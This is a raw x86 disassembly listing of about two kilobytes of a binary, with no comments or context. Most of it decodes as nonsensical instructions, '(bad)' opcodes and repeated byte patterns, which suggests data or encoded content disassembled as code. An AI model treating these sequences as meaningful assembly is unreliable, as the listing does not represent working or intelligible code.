  422b55:	int    0xc6
  422b57:	or     eax,0x808169bd
  422b5c:	adc    dh,0x14
  422b5f:	int    0x76
  422b61:	mov    ebp,0xd30de6cd
  422b66:	lods   eax,DWORD PTR ds:[esi]
  422b67:	xchg   DWORD PTR [ebx],esi
  422b69:	retf   
  422b6a:	ror    BYTE PTR [eax+0x7ae4cfa8],0x84
  422b71:	in     al,dx
  422b72:	push   esi
  422b73:	int    0xc6
  422b75:	or     eax,0xbd92c704
  422b7a:	daa    
  422b7b:	add    DWORD PTR [eax-0x32e32980],0xe6cdbd76
  422b85:	or     eax,0xc087add3
  422b8a:	mov    BYTE PTR [esi-0x30577740],bl
  422b90:	gs jp  0x422b17
  422b93:	add    DWORD PTR [eax-0x3ccf1380],0x80809284
  422b9d:	xchg   esi,esp
  422b9f:	or     eax,0x699e30c0
  422ba4:	add    BYTE PTR [ecx-0x72f57f80],0xb5
  422bab:	xor    ebp,DWORD PTR [ebp+0x6c]
  422bae:	int    0x10
  422bb0:	mov    ebp,0x808081bc
  422bb5:	int    0x7d
  422bb7:	xor    ecx,DWORD PTR [edi]
  422bb9:	xor    ah,0x81
  422bbc:	lea    esi,[ebp-0x7b8a19fc]
  422bc2:	das    
  422bc3:	add    al,0xd0
  422bc5:	add    BYTE PTR [eax+0x75760480],0x8b
  422bcc:	int    0x8d
  422bce:	mov    ch,0x4
  422bd0:	cli    
  422bd1:	test   BYTE PTR [edx-0x61783f79],al
  422bd7:	int    0xe6
  422bd9:	jge    0x422bae
  422bdb:	xacquire xchg BYTE PTR [ebx],dh
  422bde:	ins    DWORD PTR es:[edi],dx
  422bdf:	ins    BYTE PTR es:[edi],dx
  422be0:	shr    BYTE PTR [eax+ebp*4-0x31],0x65
  422be5:	outs   dx,DWORD PTR ds:[esi]
  422be6:	lods   al,BYTE PTR ds:[esi]
  422be7:	xchg   DWORD PTR [eax-0x42ef3280],eax
  422bed:	inc    esp
  422bee:	add    DWORD PTR [eax+0x337dcd80],0xaf4820f
  422bf8:	lea    edi,[ebp+0x4a58d0a]
  422bfe:	cli    
  422bff:	test   BYTE PTR [edx+0x402cd77],al
  422c05:	mov    dh,0xa5
  422c07:	and    ebx,0xa58d04ef
  422c0d:	xchg   edx,eax
  422c0e:	mov    es,WORD PTR [edx+edi*8]
  422c11:	dec    esi
  422c12:	ja     0x422c32
  422c14:	pop    ebp
  422c15:	rcl    DWORD PTR [edx-0x2ccc7f80],1
  422c1b:	int    0xf
  422c1d:	fidiv  DWORD PTR [esi-0x5a89785b]
  422c23:	jecxz  0x422bd2
  422c25:	xchg   DWORD PTR [esi+0x7d],esi
  422c28:	or     dh,BYTE PTR [esi+0xd]
  422c2b:	in     al,dx
  422c2c:	inc    esi
  422c2d:	add    al,0xef
  422c2f:	test   BYTE PTR [ebp-0x7f7f7fc9],bh
  422c35:	jecxz  0x422c23
  422c37:	jecxz  0x422bef
  422c39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c3a:	pop    esi
  422c3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c3c:	lods   eax,DWORD PTR ds:[esi]
  422c3d:	add    BYTE PTR [esi+0x3ea57600],0xa6
  422c44:	lods   eax,DWORD PTR ds:[esi]
  422c45:	mov    ss,esi
  422c47:	mov    ebp,0x8086745d
  422c4c:	add    BYTE PTR [edi+0x760a7d76],0xd
  422c53:	shl    DWORD PTR [esi-0x7b3f7b5b],cl
  422c59:	test   al,0x33
  422c5b:	add    BYTE PTR [edx-0x33],bh
  422c5e:	leave  
  422c5f:	int    0xc6
  422c61:	or     eax,0x808059bd
  422c66:	cmp    BYTE PTR ds:0x8987d481,0xe6
  422c6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c6e:	jecxz  0x422c59
  422c70:	mov    ss,esi
  422c72:	in     eax,dx
  422c73:	in     al,dx
  422c74:	add    BYTE PTR [eax],0x76
  422c77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c78:	int    0x8d
  422c7a:	mov    ch,0x4
  422c7c:	rcl    DWORD PTR [edx-0x32021933],cl
  422c82:	leave  
  422c83:	xor    esi,DWORD PTR [esi+0x34]
  422c86:	pop    esi
  422c87:	jbe    0x422c2e
  422c89:	jnp    0x422c15
  422c8b:	int    0xf8
  422c8d:	xor    edx,esi
  422c8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c90:	int    0x96
  422c92:	cmp    al,0x45
  422c94:	inc    ecx
  422c95:	inc    ebx
  422c96:	add    esi,DWORD PTR [edi-0x79]
  422c99:	jle    0x422c71
  422c9b:	clc    
  422c9c:	or     ah,dh
  422c9e:	std    
  422c9f:	das    
  422ca0:	pop    ecx
  422ca1:	adc    DWORD PTR [ebx-0x1a],eax
  422ca4:	cmp    al,0x2f
  422ca6:	or     esp,DWORD PTR [edx-0x2]
  422ca9:	add    BYTE PTR [eax],al
  422cab:	mov    ebp,0x80808040
  422cb0:	xor    ebp,DWORD PTR [ebp-0x31]
  422cb3:	les    esi,FWORD PTR [esp+eiz*2]
  422cb6:	int    0x96
  422cb8:	sub    al,0xcd
  422cba:	(bad)  
  422cbb:	stc    
  422cbc:	xor    edx,esi
  422cbe:	sbb    al,0xa
  422cc0:	inc    edx
  422cc1:	int    0x96
  422cc3:	inc    esp
  422cc4:	int    0xe6
  422cc6:	std    
  422cc7:	xor    esp,esi
  422cc9:	xor    al,0xa
  422ccb:	pusha  
  422ccc:	retf   
  422ccd:	arpl   WORD PTR [eax-0x7fdb2d56],bp
  422cd3:	test   al,0x9c
  422cd5:	xor    ebp,DWORD PTR [ebp+0x6c]
  422cd8:	in     al,dx
  422cd9:	popf   
  422cda:	adc    bh,ah
  422cdc:	add    BYTE PTR [eax-0x7e7d7e80],0xc5
  422ce3:	shl    ebp,cl
  422ce5:	mov    BYTE PTR [eax+0x43f9d6cd],bl
  422ceb:	(bad)  
  422cec:	and    al,0x77
  422cee:	mov    ch,0xcd
  422cf0:	jbe    0x422c9f
  422cf2:	shr    DWORD PTR [ebp+0x760a4588],cl
  422cf8:	lods   eax,DWORD PTR ds:[esi]
  422cf9:	or     dl,dh
  422cfb:	stc    
  422cfc:	test   al,0xc5
  422cfe:	int    0x8d
  422d00:	jne    0x422d31
  422d02:	pop    ecx
  422d03:	ins    DWORD PTR es:[edi],dx
  422d04:	shl    edx,cl
  422d06:	test   BYTE PTR [edi-0x2c78428a],al
  422d0c:	in     al,dx
  422d0d:	xchg   BYTE PTR [edi],ch
  422d0f:	pop    ecx
  422d10:	ins    DWORD PTR es:[edi],dx
  422d11:	xchg   DWORD PTR [esi+0x75],esi
  422d14:	int    0xc6
  422d16:	jge    0x422ce7
  422d18:	les    esi,FWORD PTR [esi-0x80]
  422d1b:	xor    ebp,DWORD PTR [ebp-0x31]
  422d1e:	les    esi,FWORD PTR [esi-0x80]
  422d21:	adc    bh,ah
  422d23:	add    BYTE PTR [eax+0x24778180],0xcd
  422d2a:	mov    WORD PTR [esp+ebx*2],?
  422d2d:	shl    DWORD PTR [esp+esi*1-0x73bc77d4],cl
  422d34:	xor    al,0xa4
  422d36:	ja     0x422d5d
  422d38:	retf   0x31
  422d3b:	je     0x422d71
  422d3d:	pop    esp
  422d3e:	shl    ebp,cl
  422d40:	mov    BYTE PTR [ecx],cl
  422d42:	xchg   esp,eax
  422d43:	xor    al,0x2c
  422d45:	int    0xc
  422d47:	das    
  422d48:	mov    ebx,0xebd38096
  422d4d:	push   ebx
  422d4e:	das    
  422d4f:	rcl    DWORD PTR [ebx],1
  422d51:	pop    esi
  422d52:	mov    WORD PTR [esp+ebp*1],?
  422d55:	ja     0x422d71
  422d57:	int    0xdb
  422d59:	pop    edi
  422d5a:	or     BYTE PTR [eax+0x13338080],0xd3
  422d61:	jmp    0x422ce8
  422d63:	mov    eax,0x87808d81
  422d68:	ins    DWORD PTR es:[edi],dx
  422d69:	iret   
  422d6a:	les    esi,FWORD PTR [esp+ebp*2]
  422d6d:	(bad)
  422d70:	test   DWORD PTR [esi],edi
  422d72:	mov    WORD PTR [esp+ebp*1],?
  422d75:	xor    ebx,ebx
  422d77:	mov    eax,0x8780963e
  422d7c:	ins    DWORD PTR es:[edi],dx
  422d7d:	add    al,0x6d
  422d7f:	or     edi,0xc56c34c4
  422d85:	cwde   
  422d86:	int    0xf0
  422d88:	mov    ebp,0xfcd9
  422d8d:	int    0xd9
  422d8f:	int    0xf
  422d91:	jns    0x422d19
  422d93:	mov    bh,0xbd
  422d95:	sub    esp,edi
  422d97:	add    BYTE PTR [eax],al
  422d99:	cwde   
  422d9a:	int    0xf0
  422d9c:	jns    0x422e16
  422d9e:	test   DWORD PTR [ebx+0xfc6bbd],esp
  422da4:	add    BYTE PTR [eax-0x58798787],bl
  422daa:	mov    ebp,0xfc38
  422daf:	jns    0x422e29
  422db1:	xchg   edx,eax
  422db2:	cmp    eax,0xeceb99cd
  422db7:	add    eax,DWORD PTR [eax]
  422db9:	add    BYTE PTR [esi-0x12ed1233],dl
  422dbf:	inc    esp
  422dc0:	add    DWORD PTR [eax-0x6893680],0x35862149
  422dca:	leave  
  422dcb:	jbe    0x422d82
  422dcd:	inc    ecx
  422dce:	and    DWORD PTR [esi-0x778932cb],eax
  422dd4:	or     dh,BYTE PTR [esi-0x78]
  422dd7:	int    0x76
  422dd9:	stc    
  422dda:	int    0x96
  422ddc:	stc    
  422ddd:	pop    ebx
  422dde:	cwde   
  422ddf:	call   0xd3e3:0x3b9effc0
  422de6:	jmp    0x3586:0x21d1bf28
  422ded:	cmp    eax,ebp
  422def:	sar    DWORD PTR [ebp+0xad25392],cl
  422df5:	jbe    0x422e6c
  422df7:	int    0x76
  422df9:	stc    
  422dfa:	int    0x96
  422dfc:	stc    
  422dfd:	cmp    eax,ebp
  422dff:	sar    DWORD PTR [ebp-0x2c1cc46e],cl
  422e05:	jmp    0xfd76:0xad25328
  422e0c:	int    0x76
  422e0e:	stc    
  422e0f:	int    0x96
  422e11:	stc    
  422e12:	cmp    eax,ebp
  422e14:	sar    DWORD PTR [ebp-0x2c1cc46e],cl
  422e1a:	jmp    0xd076:0xad25328
  422e21:	int    0x76
  422e23:	stc    
  422e24:	int    0x96
  422e26:	stc    
  422e27:	cmp    eax,ebp
  422e29:	sar    DWORD PTR [ebp-0x2c1cc46e],cl
  422e2f:	jmp    0xbd76:0xad25328
  422e36:	leave  
  422e37:	jbe    0x422e66
  422e39:	dec    ecx
  422e3a:	and    DWORD PTR [ebp+esi*1+0x496576c9],eax
  422e41:	mov    al,ds:0x76c93586
  422e46:	and    eax,0x35862169
  422e4b:	sar    BYTE PTR [esp+ebx*4],0xa
  422e4f:	jbe    0x422e21
  422e51:	or     dh,BYTE PTR [esi-0x30]
  422e54:	sar    BYTE PTR [esp+ebx*4+0xad0760a],0x76
  422e5c:	ror    cl,1
  422e5e:	jbe    0x422e30
  422e60:	jo     0x422de2
  422e62:	add    BYTE PTR [eax+0x78d076c9],0x80
  422e69:	add    BYTE PTR [eax-0x32068933],0x96
  422e70:	stc    
  422e71:	cmp    eax,ebp
  422e73:	cmp    esp,ebx
  422e75:	sar    DWORD PTR [ebp+0x28ead392],cl
  422e7b:	push   ebx
  422e7c:	ror    BYTE PTR [edx],cl
  422e7e:	jbe    0x422e50
  422e80:	int    0x76
  422e82:	stc    
  422e83:	int    0x96
  422e85:	stc    
  422e86:	cmp    eax,ebp
  422e88:	cmp    esp,ebx
  422e8a:	sar    DWORD PTR [ebp+0x28ead392],cl
  422e90:	push   ebx
  422e91:	ror    BYTE PTR [edx],cl
  422e93:	jbe    0x422e65
  422e95:	leave  
  422e96:	jbe    0x422e2d
  422e98:	arpl   WORD PTR [edx+0x76c98080],dx
  422e9e:	lods   eax,DWORD PTR ds:[esi]
  422e9f:	pop    esi
  422ea0:	add    BYTE PTR [eax+0xd76c980],0xe6
  422ea7:	add    BYTE PTR [eax-0xa983080],0xff
  422eae:	add    BYTE PTR [eax],al
  422eb0:	iret   
  422eb1:	push   edi
  422eb2:	xchg   ebp,eax
  422eb3:	inc    DWORD PTR [eax]
  422eb5:	add    BYTE PTR [ebp+0xff13],bh
  422ebb:	add    BYTE PTR [ebp+0xf3d60d],cl
  422ec1:	lea    ebp,[ebp-0x72ff562a]
  422ec7:	xchg   ebp,eax
  422ec8:	(bad)  
  422ec9:	fcmove st,st(1)
  422ecb:	jbe    0x422e7a
  422ecd:	dec    esi
  422ece:	ins    BYTE PTR es:[edi],dx
  422ecf:	add    BYTE PTR [eax-0x32068933],0x8d
  422ed6:	stc    
  422ed7:	cmp    eax,ebp
  422ed9:	sar    DWORD PTR [ebp-0x57003f6e],cl
  422edf:	cmp    ecx,DWORD PTR [edi]
  422ee1:	shl    edx,cl
  422ee3:	sub    BYTE PTR [ebx-0x2d],dl
  422ee6:	or     dh,BYTE PTR [esi+0x6d]
  422ee9:	int    0x76
  422eeb:	stc    
  422eec:	int    0x8d
  422eee:	stc    
  422eef:	add    al,0xb6
  422ef1:	cmc    
  422ef2:	cmp    BYTE PTR [ebx],0xc5
  422ef5:	sar    DWORD PTR [ebp-0x2cf0c46e],cl
  422efb:	repnz sub BYTE PTR [ebx-0x2d],dl
  422eff:	or     dh,BYTE PTR [esi-0x6b]
  422f02:	mov    ah,0xb1
  422f04:	sbb    al,0x80
  422f06:	add    BYTE PTR [eax-0x320a89f6],0x6c
  422f0d:	push   eax
  422f0e:	or     dh,BYTE PTR [esi-0x13]
  422f11:	int    0x6c
  422f13:	dec    esp
  422f14:	or     dh,BYTE PTR [esi+0x11]
  422f17:	int    0x76
  422f19:	mov    bh,cl
  422f1b:	(bad)  
  422f1c:	cmc    
  422f1d:	or     cl,BYTE PTR [ecx]
  422f1f:	rol    BYTE PTR [ecx+0x76cd8080],1
  422f25:	mov    bh,cl
  422f27:	(bad)  
  422f28:	in     eax,dx
  422f29:	or     cl,BYTE PTR [ecx]
  422f2b:	push   ebp
  422f2c:	add    DWORD PTR [eax-0x77893280],0xcf88d600
  422f36:	lea    edx,[ecx]
  422f38:	or     cl,BYTE PTR [ecx]
  422f3a:	pop    ebp
  422f3b:	add    DWORD PTR [eax+0x3eccbd80],0x8dcd8080
  422f45:	stc    
  422f46:	int    0x96
  422f48:	stc    
  422f49:	cmp    ecx,DWORD PTR [ebx+edi*1]
  422f4c:	cdq    
  422f4d:	shr    ebx,cl
  422f4f:	xchg   edx,eax
  422f50:	shr    edx,cl
  422f52:	sub    BYTE PTR [ebx+0x13],dl
  422f55:	inc    ebx
  422f56:	jge    0x422f87
  422f58:	add    eax,0x808087ca
  422f5d:	int    0x76
  422f5f:	mov    ch,cl
  422f61:	add    DWORD PTR ds:0xcd808081,esi
  422f67:	mov    ch,cl
  422f69:	jbe    0x422ef3
  422f6b:	int    0x1
  422f6d:	xor    eax,0xcd808081
  422f72:	add    BYTE PTR [edi-0x72329b92],0x88
  422f79:	int    0xa
  422f7b:	adc    DWORD PTR [ecx+0x17cf8080],eax
  422f81:	adc    al,0x0
  422f83:	add    BYTE PTR [eax],al
  422f85:	(bad)  
  422f86:	int    0x96
  422f88:	mov    ch,cl
  422f8a:	mov    ds:0x80808125,al
  422f8f:	int    0x22
  422f91:	xchg   DWORD PTR [eax-0x7f7f7ff7],esi
  422f97:	rol    BYTE PTR [eax+eax*1-0x7f7f3330],0x80
  422f9f:	bound  eax,QWORD PTR [eax]
  422fa1:	jno    0x422fc7
  422fa3:	cmp    ebp,DWORD PTR [ebp-0x37]
  422fa6:	push   es
  422fa7:	push   esp
  422fa8:	add    BYTE PTR [eax],al
  422faa:	add    BYTE PTR [esi],cl
  422fac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422fad:	aad    0x49
  422faf:	leave  
  422fb0:	push   es
  422fb1:	pop    esp
  422fb2:	add    BYTE PTR [eax],al
  422fb4:	add    BYTE PTR [edi+0x35],dl
  422fb7:	adc    ebp,DWORD PTR [ebx+0x6406c9]
  422fbd:	add    BYTE PTR [eax],al
  422fbf:	mov    ds:0x79d735c1,eax
  422fc4:	push   es
  422fc5:	ins    BYTE PTR es:[edi],dx
  422fc6:	add    BYTE PTR [eax],al
  422fc8:	add    BYTE PTR [eax],bl
  422fca:	iret   
  422fcb:	outs   dx,BYTE PTR ds:[si]
  422fcd:	add    BYTE PTR [eax],al
  422fcf:	add    BYTE PTR [edi+0x3b41afb8],ch
  422fd5:	ins    DWORD PTR es:[edi],dx
  422fd6:	leave  
  422fd7:	push   es
  422fd8:	sub    al,0x0
  422fda:	add    BYTE PTR [eax],al
  422fdc:	push   cs
  422fdd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422fde:	aad    0x49
  422fe0:	leave  
  422fe1:	push   es
  422fe2:	xor    al,0x0
  422fe4:	add    BYTE PTR [eax],al
  422fe6:	push   edi
  422fe7:	xor    eax,0x6c9ab13
  422fec:	cmp    al,0x0
  422fee:	add    BYTE PTR [eax],al
  422ff0:	mov    ds:0x79c335c1,eax
  422ff5:	push   es
  422ff6:	inc    esp
  422ff7:	add    BYTE PTR [eax],al
  422ff9:	add    BYTE PTR [eax],bl
  422ffb:	iret   
  422ffc:	addr16 inc esi
  422ffe:	add    BYTE PTR [eax],al
  423000:	add    BYTE PTR [edi-0x32be5048],ch
  423006:	jbe    0x422f90
  423008:	int    0x1
  42300a:	adc    DWORD PTR [ecx-0x19327f80],eax
  423010:	mov    BYTE PTR [ebp*2+0x35760a30],al
  423017:	int    0x76
  423019:	mov    ch,cl
  42301b:	add    DWORD PTR [ebp-0x7f],edi
  42301e:	add    BYTE PTR [eax+0x410176c9],0xa7
  423025:	mov    dl,0x35
  423027:	leave  
  423028:	jbe    0x42302f
  42302a:	mov    bh,0x3f
  42302c:	cmp    DWORD PTR [edi-0x48],eax
  42302f:	leave  
  423030:	jbe    0x42303b
  423032:	xlat   BYTE PTR ds:[ebx]
  423033:	sbb    cl,cl
  423035:	push   es
  423036:	les    eax,FWORD PTR [eax]
  423038:	add    BYTE PTR [eax],al
  42303a:	push   cs
  42303b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42303c:	aad    0x49
  42303e:	leave  
  42303f:	push   es
  423040:	nop
  423041:	add    BYTE PTR [eax],al
  423043:	add    BYTE PTR [edi+0x35],dl
  423046:	xlat   BYTE PTR ds:[ebx]
  423047:	inc    ecx
  423048:	leave  
  423049:	push   es
  42304a:	aam    0x0
  42304c:	add    BYTE PTR [eax],al
  42304e:	cmp    DWORD PTR [ecx+0x57],ecx
  423051:	jge    0x42301c
  423053:	push   es
  423054:	fadd   QWORD PTR [eax]
  423056:	add    BYTE PTR [eax],al
  423058:	mov    cl,0x3f
  42305a:	shl    DWORD PTR ds:0xe406c9,0x0
  423061:	add    BYTE PTR [edi-0x49],al
  423064:	xlat   BYTE PTR ds:[ebx]
  423065:	sbb    cl,cl
  423067:	push   es
  423068:	pushf  
  423069:	add    BYTE PTR [eax],al
  42306b:	add    BYTE PTR [esi],cl
  42306d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42306e:	aad    0x49
  423070:	leave  
  423071:	push   es
  423072:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423073:	add    BYTE PTR [eax],al
  423075:	add    BYTE PTR [edi+0x35],dl
  423078:	xlat   BYTE PTR ds:[ebx]
  423079:	inc    ecx
  42307a:	leave  
  42307b:	push   es
  42307c:	lods   al,BYTE PTR ds:[esi]
  42307d:	add    BYTE PTR [eax],al
  42307f:	add    BYTE PTR [ecx],bh
  423081:	dec    ecx
  423082:	push   edi
  423083:	jge    0x42304e
  423085:	push   es
  423086:	mov    ah,0x0
  423088:	add    BYTE PTR [eax],al
  42308a:	mov    cl,0x3f
  42308c:	shl    DWORD PTR ds:0xbc06c9,0x0
  423093:	add    BYTE PTR [edi-0x49],al
  423096:	ret    
  423097:	sbb    BYTE PTR [ebp-0x7f7fc39d],bh
  42309d:	jo     0x42306c
  42309f:	jbe    0x4230d6
  4230a1:	add    BYTE PTR [eax],dh
  4230a3:	int    0x76
  4230a5:	stc    
  4230a6:	int    0x8d
  4230a8:	stc    
  4230a9:	cmp    eax,ebp
  4230ab:	cmp    ecx,DWORD PTR [edi]
  4230ad:	shl    edx,cl
  4230af:	sub    bl,dl
  4230b1:	mov    ebp,0xcdd35392
  4230b6:	lea    ebp,[ebp+0x52fd343]
  4230bc:	test   BYTE PTR [ecx+0x76cd8080],0xb5
  4230c3:	int    0x8d
  4230c5:	mov    ch,0x3b
  4230c7:	lds    edi,FWORD PTR [ebx]
  4230c9:	psrlq  mm6,mm2
  4230cc:	sub    bl,dl
  4230ce:	mov    ebp,0xcdd35392
  4230d3:	lea    ebp,[ebp+0x76cd7d33]
  4230d9:	ins    DWORD PTR es:[edi],dx
  4230da:	inc    ebx
  4230db:	shr    DWORD PTR [edi],cl
  4230dd:	or     ch,dl
  4230df:	add    DWORD PTR [eax+0x3d76c980],0x80808080
  4230e9:	int    0x76
  4230eb:	mov    ch,cl
  4230ed:	rcl    BYTE PTR [ecx],1
  4230ef:	add    DWORD PTR [eax-0x77193280],0xcd8876cd
  4230f9:	add    DWORD PTR [ebp-0x7f],esi
  4230fc:	add    BYTE PTR [eax-0x7fc50943],0x80
  423103:	jo     0x423105
  423105:	cwde   
  423106:	xor    ch,cl
  423108:	lea    ecx,[eax-0x7ebaf533]
  42310e:	add    BYTE PTR [eax+0x76cd810a],0x88
  423115:	int    0x5d
  423117:	adc    DWORD PTR [ecx-0x29327f80],eax
  42311d:	mov    BYTE PTR [ebx],bh
  42311f:	ins    DWORD PTR es:[edi],dx
  423120:	iret   
  423121:	pop    ss
  423122:	pushf  
  423123:	add    BYTE PTR [eax],al
  423125:	add    BYTE PTR [ebp-0x7f7fc36e],bh
  42312b:	jo     0x4230fa
  42312d:	jbe    0x4230b7
  42312f:	int    0x1
  423131:	inc    ebp
  423132:	add    DWORD PTR [eax+0x500080],0x760a889a
  42313c:	adc    eax,0xcd8876cd
  423141:	pop    ebp
  423142:	adc    DWORD PTR [ecx-0x29327f80],eax
  423148:	mov    BYTE PTR [ebx],bh
  42314a:	ins    DWORD PTR es:[edi],dx
  42314b:	iret   
  42314c:	pop    ss
  42314d:	les    eax,FWORD PTR [eax]
  42314f:	add    BYTE PTR [eax],al
  423151:	mov    ebp,0x80803ad9
  423156:	jo     0x423125
  423158:	jbe    0x4230e2
  42315a:	int    0x1
  42315c:	inc    ebp
  42315d:	add    DWORD PTR [eax+0x500080],0x76cd889a
  423167:	mov    ch,cl
  423169:	pop    ebp
  42316a:	adc    DWORD PTR [ecx-0x29327f80],eax
  423170:	mov    BYTE PTR [ebx],bh
  423172:	ins    DWORD PTR es:[edi],dx
  423173:	iret   
  423174:	pop    ss
  423175:	push   esp
  423176:	add    BYTE PTR [eax],al
  423178:	add    BYTE PTR [ebp-0x7f7fc52f],bh
  42317e:	jo     0x42314d
  423180:	jbe    0x42310a
  423182:	int    0x1
  423184:	inc    ebp
  423185:	add    DWORD PTR [eax+0x500080],0xb604889a
  42318f:	pop    ebp
  423190:	or     BYTE PTR [edx],0x76
  423193:	xor    eax,0xc05d76cd
  423198:	push   ds
  423199:	cmp    ebx,edx
  42319b:	sahf   
  42319c:	clc    
  42319d:	add    al,BYTE PTR [ecx]
  42319f:	shr    BYTE PTR [esi+0x2f],cl
  4231a2:	pop    ecx
  4231a3:	shl    BYTE PTR [eax+0x0],cl
  4231a6:	xchg   esi,eax
  4231a7:	xor    eax,0x43d66d06
  4231ac:	int    0x76
  4231ae:	pop    ebp
  4231af:	add    al,0xad
  4231b1:	mov    eax,DWORD PTR [ebp*2-0x69ff8faf]
  4231b8:	adc    eax,0x40d46d06
  4231bd:	int    0x76
  4231bf:	mov    ch,cl
  4231c1:	pop    ebp
  4231c2:	adc    DWORD PTR [ecx-0x29327f80],eax
  4231c8:	mov    BYTE PTR [ebx],bh
  4231ca:	ins    DWORD PTR es:[edi],dx
  4231cb:	iret   
  4231cc:	xchg   esi,eax
  4231cd:	add    DWORD PTR [ebp-0x7f7fc560],edi
  4231d3:	jo     0x4231a2
  4231d5:	jbe    0x42315f
  4231d7:	int    0x1
  4231d9:	cmp    eax,0x808081
  4231de:	push   eax
  4231df:	add    BYTE PTR [edx+0xd760a88],bl
  4231e5:	in     al,dx
  4231e6:	test   BYTE PTR [esi+esi*4],al
  4231e9:	or     eax,0x5d760080
  4231ee:	add    al,0xe6
  4231f0:	pop    ebp
  4231f1:	sub    al,0x82
  4231f3:	sub    eax,0xcdb576cd
  4231f8:	lea    esi,[ebp-0x3f772933]
  4231fe:	jmp    FWORD PTR [edx-0xfc43ac5]
  423204:	sar    DWORD PTR [ebp+0x28f2d392],cl
  42320a:	push   ebx
  42320b:	ror    edi,cl
  42320d:	pop    ss
  42320e:	cmc    
  42320f:	inc    DWORD PTR [eax]
  423211:	add    BYTE PTR [ebp-0x7f7fc5e8],bh
  423217:	jo     0x4231e6
  423219:	jbe    0x423214
  42321b:	int    0x8d
  42321d:	stc    
  42321e:	int    0xd6
  423220:	mov    BYTE PTR [ebx],bh
  423222:	lds    edi,FWORD PTR [ebx]
  423224:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  42322b:	push   ebx
  42322c:	ror    edi,cl
  42322e:	pop    ss
  42322f:	xchg   ebp,eax
  423230:	inc    DWORD PTR [eax]
  423232:	add    BYTE PTR [ebp-0x7f7fc70a],bh
  423238:	jo     0x42323a
  42323a:	xchg   esi,eax
  42323b:	or     eax,0xcdf98dcd
  423240:	xchg   esi,eax
  423241:	stc    
  423242:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423245:	(bad)  
  423247:	jmp    0x4231db
  423249:	shr    edx,cl
  42324b:	sub    BYTE PTR [ebx+0x13],dl
  42324e:	inc    ebx
  42324f:	jge    0x423227
  423251:	mov    ecx,ecx
  423253:	jbe    0x423292
  423255:	add    DWORD PTR [eax+0x76cd8080],0xb58dcdb5
  42325f:	cmp    eax,ebp
  423261:	sar    DWORD PTR [ebp-0x2c0fc46e],cl
  423267:	repnz sub BYTE PTR [ebx-0x2d],dl
  42326b:	xchg   DWORD PTR [esi+0x6d],esi
  42326e:	or     dh,BYTE PTR [esi+0x6d]
  423271:	int    0x76
  423273:	cmp    eax,0x1cd46d06
  423278:	int    0x76
  42327a:	mov    ch,0xcd
  42327c:	lea    esi,[ebp-0xfc43ac5]
  423282:	sar    DWORD PTR [ebp+0x28f2d392],cl
  423288:	push   ebx
  423289:	rol    DWORD PTR [edi+0x760a9576],cl
  42328f:	xchg   ebp,eax
  423290:	int    0x76
  423292:	mov    ch,0xcd
  423294:	lea    esi,[ebp-0xfc43ac5]
  42329a:	shl    edx,cl
  42329c:	sub    bl,dl
  42329e:	mov    ebp,0xcdd35392
  4232a3:	lea    ebp,[ebp+0x76cd7d33]
  4232a9:	ins    DWORD PTR es:[edi],dx
  4232aa:	inc    ebx
  4232ab:	shr    DWORD PTR [edi],cl
  4232ad:	pop    es
  4232ae:	push   eax
  4232af:	inc    DWORD PTR [eax]
  4232b1:	add    al,al
  4232b3:	jmp    FWORD PTR [eax-0x326a8933]
  4232b9:	lea    ebp,[ebp+0x43]
  4232bc:	jge    0x423294
  4232be:	xor    DWORD PTR [eax],eax
  4232c0:	(bad)  
  4232c1:	mov    bh,cl
  4232c3:	jbe    0x4232c2
  4232c5:	jo     0x423284
  4232c7:	stc    
  4232c8:	jl     0x42324a
  4232ca:	or     BYTE PTR [edx],0x76
  4232cd:	jne    0x4232bb
  4232cf:	sbb    cl,ch
  4232d1:	jbe    0x423348
  4232d3:	int    0x8d
  4232d5:	mov    ch,0xcd
  4232d7:	xchg   esi,eax
  4232d8:	mov    ch,0x3b
  4232da:	or     al,0x3b
  4232dc:	cdq    
  4232dd:	shr    ebx,cl
  4232df:	xchg   edx,eax
  4232e0:	shr    edx,cl
  4232e2:	sub    BYTE PTR [ebx+0x13],dl
  4232e5:	push   ecx
  4232e6:	mov    ch,cl
  4232e8:	jbe    0x4232e3
  4232ea:	int    0x8d
  4232ec:	stc    
  4232ed:	cmp    eax,ebp
  4232ef:	cmp    ecx,DWORD PTR [edi]
  4232f1:	shl    edx,cl
  4232f3:	sub    bl,dl
  4232f5:	mov    ebp,0xcdd35392
  4232fa:	lea    esi,[ebp+0x43]
  4232fd:	shr    DWORD PTR [edi],cl
  4232ff:	add    eax,0x80805300
  423304:	int    0x76
  423306:	stc    
  423307:	int    0x8d
  423309:	stc    
  42330a:	cmp    eax,ebp
  42330c:	cmp    ecx,DWORD PTR [edi]
  42330e:	shl    edx,cl
  423310:	sub    bl,dl
  423312:	mov    ebp,0xcdd35392
  423317:	(bad)  
  423318:	std    
  423319:	inc    ebx
  42331a:	shr    DWORD PTR [edi],cl
  42331c:	add    eax,0x808053ea
  423321:	int    0x76
  423323:	stc    
  423324:	int    0x8d
  423326:	stc    
  423327:	cmp    eax,ebp
  423329:	cmp    ecx,DWORD PTR [edi]
  42332b:	sar    DWORD PTR [ebp+0x28f2d392],cl
  423331:	push   ebx
  423332:	shr    esp,cl
  423334:	adc    al,0xcd
  423336:	lea    esi,[ebp+0x3bb596cd]
  42333c:	or     al,0x3b
  42333e:	cdq    
  42333f:	shr    ebx,cl
  423341:	xchg   edx,eax
  423342:	shr    edx,cl
  423344:	sub    BYTE PTR [ebx+0x13],dl
  423347:	xchg   ebx,edx
  423349:	int    0x8d
  42334b:	std    
  42334c:	inc    ebx
  42334d:	rol    DWORD PTR [edx-0x2893219],cl
  423353:	or     dh,BYTE PTR [esi-0x53]
  423356:	int    0x76
  423358:	jne    0x423364
  42335a:	jbe    0x42332c
  42335c:	ret    
  42335d:	dec    ecx
  42335e:	and    DWORD PTR [esi+0x45e60a35],eax
